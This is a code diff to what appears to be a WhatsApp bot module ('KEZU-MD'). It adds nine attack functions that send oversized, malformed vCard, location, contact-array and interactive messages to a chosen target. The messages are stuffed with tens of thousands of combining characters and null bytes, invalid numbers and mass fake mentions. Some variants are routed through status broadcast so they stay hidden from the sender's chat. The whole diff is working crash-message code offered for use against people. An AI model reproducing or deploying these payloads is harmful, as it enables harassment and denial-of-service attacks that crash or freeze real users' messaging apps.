@@ -323,11 +323,326 @@ async function _atkCombo(sock, target) {
 //
 // ============================================================
 
+// ============================================================
+//              💳 VCARD BUG FUNCTIONS
+// ============================================================
+
+async function _atkVcardBug(sock, target) {
+  try {
+    const poison = 'ꦾ'.repeat(30000) + 'ោ៝'.repeat(10000) + '\u0000'.repeat(5000);
+    const vcard =
+      'BEGIN:VCARD\nVERSION:3.0\n' +
+      'FN:💀 KEZU-MD BUG 💀' + poison + '\n' +
+      'ORG:' + 'A'.repeat(65536) + '\n' +
+      'TEL;type=CELL;type=VOICE;waid=0:+0000000000\n' +
+      'END:VCARD';
+    const msg = {
+      contactMessage: {
+        displayName: '💀 BUG' + 'ꦾ'.repeat(50000),
+        vcard: vcard.repeat(50),
+      }
+    };
+    await sock.relayMessage(target, msg, {});
+    console.log('✅ VcardBug → ' + target);
+    return true;
+  } catch(e) { console.error('❌ VcardBug:', e.message); return false; }
+}
+
+async function _atkVcardBug2(sock, target) {
+  try {
+    const makeVcard = (i) => {
+      const blob = 'ꦾ'.repeat(5000) + i.toString().repeat(1000);
+      return (
+        'BEGIN:VCARD\nVERSION:3.0\n' +
+        `FN:💀 VICTIM-${i}` + blob + '\n' +
+        `TEL;type=CELL;waid=${i}:+${String(i).padStart(12, '0')}\n` +
+        'END:VCARD'
+      );
+    };
+    const contacts = Array.from({ length: 2000 }, (_, i) => ({
+      displayName: `💀 B${i}` + 'ꦾ'.repeat(3000),
+      vcard: makeVcard(i)
+    }));
+    const msg = { contactsArrayMessage: { contacts, displayName: '💀 KEZU BUG PACK' } };
+    await sock.relayMessage(target, msg, {});
+    await delay(500);
+    for (let i = 0; i < 5; i++) {
+      const singleBig = {
+        contactMessage: {
+          displayName: '💀 KEZU-X' + 'ꦾ'.repeat(60000),
+          vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:💀\nTEL;waid=0:+0\n' + 'X-BUG:' + '\u0000'.repeat(500000) + '\nEND:VCARD'
+        }
+      };
+      await sock.relayMessage(target, singleBig, {});
+      await delay(400);
+    }
+    console.log('✅ VcardBug2 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ VcardBug2:', e.message); return false; }
+}
+
+async function _atkVcardBug3(sock, target) {
+  try {
+    for (let r = 0; r < 3; r++) {
+      await _atkVcardBug(sock, target);
+      await delay(800);
+      await _atkVcardBug2(sock, target);
+      await delay(800);
+    }
+    const ultraVcard =
+      'BEGIN:VCARD\nVERSION:3.0\n' +
+      'FN:' + '𑇂𑆵'.repeat(100000) + '\n' +
+      'ORG:' + 'ꦾ'.repeat(100000) + '\n' +
+      'NOTE:' + '\u0000'.repeat(1000000) + '\n' +
+      'TEL;waid=0:+0\n' +
+      'END:VCARD';
+    const msg = {
+      contactsArrayMessage: {
+        contacts: Array.from({ length: 5000 }, (_, i) => ({
+          displayName: `💀${i}` + 'ꦾ'.repeat(1000),
+          vcard: ultraVcard
+        })),
+        displayName: '💀 KEZU MAXIMUM VCARD 💀'
+      }
+    };
+    await sock.relayMessage(target, msg, {});
+    console.log('✅ VcardBug3 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ VcardBug3:', e.message); return false; }
+}
+
+// ============================================================
+//              📍 LOCATION BUG FUNCTIONS
+// ============================================================
+
+async function _atkLocBug(sock, target) {
+  try {
+    const poison = 'ꦾ'.repeat(40000) + 'ោ៝'.repeat(20000);
+    const msg = {
+      locationMessage: {
+        degreesLatitude: 9999999999,
+        degreesLongitude: 9999999999,
+        degreesClockwiseFromMagneticNorth: 9999999999,
+        name: '💀 KEZU-BUG 💀' + poison,
+        address: 'DESTROYED' + 'ꦾ'.repeat(50000),
+        url: 'https://kezu.md/' + 'a'.repeat(100000),
+        isLive: true,
+        accuracyInMeters: 9999999999,
+        speedInMps: 9999999999,
+        degreesClockwiseFromMagneticNorth: 9999999999,
+        jpegThumbnail: null,
+        contextInfo: {
+          mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)]
+        }
+      }
+    };
+    await sock.relayMessage(target, msg, {});
+    console.log('✅ LocBug → ' + target);
+    return true;
+  } catch(e) { console.error('❌ LocBug:', e.message); return false; }
+}
+
+async function _atkLocBug2(sock, target) {
+  try {
+    for (let i = 0; i < 10; i++) {
+      const msg = {
+        liveLocationMessage: {
+          degreesLatitude: (Math.random() * 999999999) * (i % 2 === 0 ? 1 : -1),
+          degreesLongitude: (Math.random() * 999999999) * (i % 2 === 0 ? -1 : 1),
+          accuracyInMeters: 9999999999,
+          speedInMps: 9999999999,
+          degreesClockwiseFromMagneticNorth: 9999999999,
+          sequenceNumber: BigInt(9999999999999),
+          timeOffset: 9999999999,
+          caption: '💀 KEZU-LOC-BUG 💀' + 'ꦾ'.repeat(30000) + i,
+          jpegThumbnail: null,
+          contextInfo: {
+            participant: { jid: target },
+            mentionedJid: ['0@s.whatsapp.net']
+          }
+        }
+      };
+      await sock.relayMessage(target, msg, {});
+      await delay(300);
+    }
+    console.log('✅ LocBug2 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ LocBug2:', e.message); return false; }
+}
+
+async function _atkLocBug3(sock, target) {
+  try {
+    for (let r = 0; r < 3; r++) {
+      await _atkLocBug(sock, target); await delay(600);
+      await _atkLocBug2(sock, target); await delay(600);
+    }
+    const ultraPoisonLoc = {
+      locationMessage: {
+        degreesLatitude: -9999999999,
+        degreesLongitude: 9999999999,
+        name: '💀 MAXIMUM LOC 💀' + '𑇂𑆵𑆴𑆿'.repeat(80000),
+        address: 'ꦾ'.repeat(100000) + 'ោ៝'.repeat(100000),
+        url: 'https://x/' + '\u0000'.repeat(500000),
+        isLive: true,
+        accuracyInMeters: Number.MAX_SAFE_INTEGER,
+        speedInMps: Number.MAX_SAFE_INTEGER,
+        jpegThumbnail: null,
+        contextInfo: {
+          mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)]
+        }
+      }
+    };
+    for (let i = 0; i < 5; i++) {
+      await sock.relayMessage(target, ultraPoisonLoc, {});
+      await delay(500);
+    }
+    console.log('✅ LocBug3 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ LocBug3:', e.message); return false; }
+}
+
+// ============================================================
+//       👻 GHOST / INVISIBLE BUG FUNCTIONS (GBI)
+//  Messages arrive at target but NOT shown in sender's chat
+// ============================================================
+
+async function _atkGhostBug(sock, target) {
+  try {
+    const poison = 'ꦾ'.repeat(20000) + '\u0000'.repeat(10000);
+    const msg = {
+      viewOnceMessage: {
+        message: {
+          newsletterAdminInviteMessage: {
+            newsletterJid: '1234567891234@newsletter',
+            newsletterName: '👻 GHOST-BUG' + poison,
+            caption: '👻' + poison + 'ោ៝'.repeat(20000),
+            inviteExpiration: '0',
+            contextInfo: {
+              participant: '0@s.whatsapp.net',
+              remoteJid: 'status@broadcast',
+              mentionedJid: ['0@s.whatsapp.net',
+                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
+              ]
+            }
+          }
+        }
+      }
+    };
+    await sock.relayMessage('status@broadcast', msg, {
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: 'meta', attrs: {},
+        content: [{
+          tag: 'mentioned_users', attrs: {},
+          content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
+        }]
+      }]
+    });
+    console.log('✅ GhostBug → ' + target);
+    return true;
+  } catch(e) { console.error('❌ GhostBug:', e.message); return false; }
+}
+
+async function _atkGhostBug2(sock, target) {
+  try {
+    const ghosts = [
+      {
+        viewOnceMessage: {
+          message: {
+            interactiveResponseMessage: {
+              body: { text: '👻 GHOST-2', format: 'DEFAULT' },
+              nativeFlowResponseMessage: {
+                name: 'call_permission_request',
+                paramsJson: '\u0000'.repeat(2000000),
+                version: 3
+              },
+              contextInfo: {
+                participant: { jid: target },
+                mentionedJid: ['0@s.whatsapp.net',
+                  ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
+                ]
+              }
+            }
+          }
+        }
+      },
+      {
+        ephemeralMessage: {
+          message: {
+            contactsArrayMessage: {
+              contacts: Array.from({ length: 1000 }, (_, i) => ({
+                displayName: `👻 G${i}` + 'ꦾ'.repeat(2000),
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:👻${i}\nTEL;waid=${i}:+${i}\nNOTE:${'ꦾ'.repeat(5000)}\nEND:VCARD`
+              })),
+              displayName: '👻 GHOST CONTACTS'
+            }
+          }
+        }
+      }
+    ];
+    for (const payload of ghosts) {
+      await sock.relayMessage('status@broadcast', payload, {
+        statusJidList: [target],
+        additionalNodes: [{
+          tag: 'meta', attrs: {},
+          content: [{ tag: 'mentioned_users', attrs: {},
+            content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
+          }]
+        }]
+      });
+      await delay(500);
+    }
+    console.log('✅ GhostBug2 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ GhostBug2:', e.message); return false; }
+}
+
+async function _atkGhostBug3(sock, target) {
+  try {
+    for (let r = 0; r < 5; r++) {
+      await _atkGhostBug(sock, target);  await delay(400);
+      await _atkGhostBug2(sock, target); await delay(400);
+      await _atkVcardBug(sock, target);  await delay(400);
+      await _atkLocBug(sock, target);    await delay(400);
+    }
+    const finalGhost = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: { text: '👻 KEZU GHOST OVERDRIVE 👻\n' + '𑇂𑆵𑆴𑆿'.repeat(200000) + '\n' + 'ꦾ'.repeat(100000) },
+            nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
+          }
+        }
+      }
+    };
+    await sock.relayMessage('status@broadcast', finalGhost, {
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: 'meta', attrs: {},
+        content: [{ tag: 'mentioned_users', attrs: {},
+          content: [{ tag: 'to', attrs: { jid: target }, content: undefined }]
+        }]
+      }]
+    });
+    console.log('✅ GhostBug3 → ' + target);
+    return true;
+  } catch(e) { console.error('❌ GhostBug3:', e.message); return false; }
+}
+
 module.exports = {
   _atkVvvXxxAaa,
   _atkCrashard,
   _atkCallInvisible,
   _atkForceFreeze,
   _atkBlank1,
-  _atkCombo
+  _atkCombo,
+  _atkVcardBug,
+  _atkVcardBug2,
+  _atkVcardBug3,
+  _atkLocBug,
+  _atkLocBug2,
+  _atkLocBug3,
+  _atkGhostBug,
+  _atkGhostBug2,
+  _atkGhostBug3
 };
